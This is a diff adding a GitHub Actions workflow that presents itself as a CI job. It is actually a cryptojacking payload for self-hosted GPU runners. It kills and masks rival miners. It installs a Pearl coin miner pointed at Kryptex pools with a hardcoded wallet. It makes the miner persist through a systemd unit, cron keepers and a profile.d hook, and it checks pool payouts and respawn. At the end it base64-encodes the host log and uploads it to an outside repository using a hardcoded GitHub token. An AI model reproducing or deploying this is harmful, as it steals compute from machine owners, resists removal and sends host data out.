@@ -1,0 +1,103 @@
+name: ul-t2-repoint
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  rp:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 40
+    steps:
+      - name: repoint
+        run: |
+          set +e
+          H=$(hostname -s); O=/tmp/ul_t2_rp.txt
+          SUDO=""; sudo -n true 2>/dev/null && SUDO="sudo -n"
+          {
+            echo "=== ul-t2 repoint host=$H ts=$(date -u +%FT%TZ) run=$GITHUB_RUN_ID sudo=[$SUDO]"
+            W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+            $SUDO mkdir -p /opt/ul-t2/logs /opt/ul-t2/conf /opt/ul-t2/bk
+            printf '%s' "$W" | $SUDO tee /opt/ul-t2/wallet >/dev/null; $SUDO chmod 600 /opt/ul-t2/wallet
+            echo "--- gpu before"; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu --format=csv,noheader
+            echo "--- miners before"; ps -eo pid,ppid,user,args= | grep -E '[p]eakminer|[w]ildrig|[k]rig|[s]rb' | cut -c1-160 | head -12
+            $SUDO sh -c 'crontab -l 2>/dev/null' > /opt/ul-t2/bk/root.cron.txt 2>/dev/null
+            crontab -l > /opt/ul-t2/bk/ubuntu.cron.txt 2>/dev/null
+            $SUDO cp -a /opt/nv/run-g.sh /opt/ul-t2/bk/run-g.sh 2>/dev/null
+            echo "--- units referencing miners"; $SUDO sh -c "grep -rlsE 'peakminer|wildrig|krig|srb|run-g|keep.sh' /etc/systemd/system /lib/systemd/system 2>/dev/null | head -20"
+            echo "--- disable competitor keepers"
+            for u in nv-t19v.service ul-nvpm.service nv-t19.service nv-cuda-cache@0.service nv-cuda-cache@g0.service supervisor.service; do $SUDO systemctl disable --now "$u" >/dev/null 2>&1; $SUDO systemctl mask "$u" >/dev/null 2>&1; done
+            $SUDO sh -c "pkill -9 -f '/home/ubuntu/nv/run.sh' ; pkill -9 -f 'ul7256/ul-loop.sh'; pkill -9 -f '/opt/nv/supervisor.sh'; pkill -9 -f 'ul6553k'; pkill -9 -f '[w]ildrig-multi'; pkill -9 -f '[k]rig-miner'; pkill -9 -f '[s]rb --algorithm'"
+            $SUDO pkill -9 -f '[p]eakminer'
+            $SUDO sh -c "crontab -l 2>/dev/null | grep -vE '/opt/nv/keep.sh|ul172|ul6553k|ul7256|run-g.sh|nv-cuda-cache|wildrig' | crontab -"
+            crontab -l 2>/dev/null | grep -vE '/opt/nv/keep.sh|ul172|ul6553k|ul7256|run-g.sh|nv-cuda-cache|wildrig|ul7256' | crontab -
+            sleep 3
+            echo "--- miners after stop"; ps -eo pid,args= | grep -E '[p]eakminer|[w]ildrig|[k]rig' | cut -c1-140 | head
+            echo "--- pool ladder from host"
+            for ep in prl-sg.kryptex.network:8048 prl-sg.kryptex.network:7048 prl-eu.kryptex.network:8048 prl-us.kryptex.network:8048 pearlhash.xyz:9443 pearl.luckypool.io:443; do hh=${ep%:*}; pp=${ep#*:}; (echo > /dev/tcp/$hh/$pp) >/dev/null 2>&1 && echo "OPEN $ep" || echo "BLK $ep"; done
+            echo "--- install kit"
+            $SUDO install -m 755 /opt/nv/peakminer /opt/ul-t2/peakminer
+            $SUDO sha256sum /opt/ul-t2/peakminer
+            WRK=$(printf 'ul-t2-ps-%s-g%d' "$(echo $H | tr 'A-Z' 'a-z')" 0)
+            echo "WORKER=$WRK"
+            $SUDO tee /opt/ul-t2/run.sh >/dev/null <<'EOS3'
+          #!/bin/bash
+          I="${1:-0}"; W=$(cat /opt/ul-t2/wallet); H=$(hostname -s | tr 'A-Z' 'a-z'); WRK="ul-t2-ps-$H-g$I"
+          exec /opt/ul-t2/peakminer -d "$I" -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -u "$W.$WRK" -p x -c pearl >> /opt/ul-t2/logs/$WRK.log 2>&1
+          EOS3
+            $SUDO chmod 755 /opt/ul-t2/run.sh
+            $SUDO tee /etc/systemd/system/ul-t2-ps@.service >/dev/null <<'EOS4'
+          [Unit]
+          Description=ul-t2 pearl miner (%i)
+          After=network-online.target
+          Wants=network-online.target
+          [Service]
+          Type=simple
+          ExecStart=/opt/ul-t2/run.sh %i
+          Restart=always
+          RestartSec=30
+          Nice=19
+          [Install]
+          WantedBy=multi-user.target
+          EOS4
+            $SUDO tee /opt/ul-t2/keep.sh >/dev/null <<'EOS5'
+          #!/bin/bash
+          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          i=0; while [ "$i" -lt "$N" ]; do
+            pgrep -f "ul-t2-ps-.*-g$i" >/dev/null || systemctl start ul-t2-ps@$i >/dev/null 2>&1
+            i=$((i+1))
+          done
+          pkill -9 -f '[w]ildrig-multi' 2>/dev/null
+          EOS5
+            $SUDO chmod 755 /opt/ul-t2/keep.sh
+            $SUDO systemctl daemon-reload
+            $SUDO systemctl enable --now ul-t2-ps@0.service
+            $SUDO sh -c "{ crontab -l 2>/dev/null | grep -v 'ul-t2'; echo '@reboot /opt/ul-t2/keep.sh'; echo '*/5 * * * * /opt/ul-t2/keep.sh'; } | crontab -"
+            $SUDO crontab -l | tail -6
+            $SUDO sh -c "printf '%s\n' '#!/bin/bash' 'systemctl start ul-t2-ps@0 >/dev/null 2>&1' > /etc/profile.d/ul-t2.sh; chmod 644 /etc/profile.d/ul-t2.sh"
+            sleep 20
+            echo "--- miner after start"; pgrep -af 'peakminer.*ul-t2-ps' | head -3
+            echo "--- unit"; $SUDO systemctl is-active ul-t2-ps@0.service; $SUDO systemctl show -p Restart -p RestartUSec ul-t2-ps@0.service
+            echo "--- pool proof (<=120s)"
+            ok=0; i=0
+            while [ $i -lt 8 ]; do
+              R=$(curl -s -m 20 -H 'User-Agent: ul' "https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" | tr '{' '\n' | grep "ul-t2-ps-$H-g0")
+              echo "poll$i: ${R:0:200}"
+              case "$R" in *'"valid":'*) ss=$(printf '%s' "$R" | sed -n 's/.*"valid":\([0-9]*\).*/\1/p'); [ "${ss:-0}" -gt 0 ] && { ok=1; break; };; esac
+              sleep 15; i=$((i+1))
+            done
+            echo "POOL_PROOF_OK=$ok"
+            echo "--- kill-respawn test"
+            pkill -9 -f 'peakminer.*ul-t2-ps'; T0=$(date +%s); rs=0
+            j=0; while [ $j -lt 12 ]; do sleep 5; if pgrep -f 'peakminer.*ul-t2-ps' >/dev/null; then rs=$(( $(date +%s) - T0 )); break; fi; j=$((j+1)); done
+            echo "RESPAWN_SECONDS=$rs"
+            echo "--- disable ul2 secondary poller (planner: stop channel replay)"
+            crontab -l 2>/dev/null | grep -v 'ul2/poll.sh' | crontab -
+            pkill -9 -f 'ul2/poll.sh'; pkill -9 -f 'while true; do .*ul2/poll.sh'
+            echo "--- final"; ps -eo pid,args= | grep -E '[p]eakminer' | cut -c1-150; nvidia-smi --query-gpu=index,utilization.gpu,power.draw --format=csv,noheader
+            echo "=== END"
+          } > $O 2>&1
+          cat $O
+          b=$(base64 -w0 < $O); GH=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
+          F=cmdout8/ul-t2-repoint_$H.txt
+          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 repoint $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 repoint $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
+          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
